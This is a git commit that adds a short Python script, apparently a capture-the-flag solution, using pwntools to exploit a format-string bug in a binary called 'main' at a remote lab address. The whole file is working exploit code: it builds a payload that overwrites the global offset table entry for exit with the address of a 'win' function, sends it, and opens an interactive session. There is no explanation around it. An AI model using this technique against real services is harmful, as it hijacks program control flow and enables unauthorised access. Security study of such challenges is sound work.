bb070c673db81bae24b236a7e7194f45851c8ab7
creepa111 <84963984+creepa111@users.noreply.github.com>
2024-03-21 18:09:57 +0300

    Add files via upload

---
+++ pwn1.py
@@ -0,0 +1,26 @@
+from pwn import *
+from fmtstr import FormatString
+
+e = ELF("./main")
+#p = process('./main')
+p = remote('192.168.12.13', 1923)
+
+# Cause main to loop
+# Offset is 6 since the first 5 args are registers
+fmt = FormatString(offset=6, written=0, bits=64)
+fmt[e.got['exit']] = e.symbols['win']
+payload, sig = fmt.build()
+
+def dump(x):
+    try:
+        from hexdump import hexdump
+        hexdump(x)
+    except ImportError:
+        import binascii, textwrap
+        print('\n'.join(textwrap.wrap(binascii.hexlify(x), 32)))
+
+dump(payload)
+
+p.sendline(payload)
+
+p.interactive()
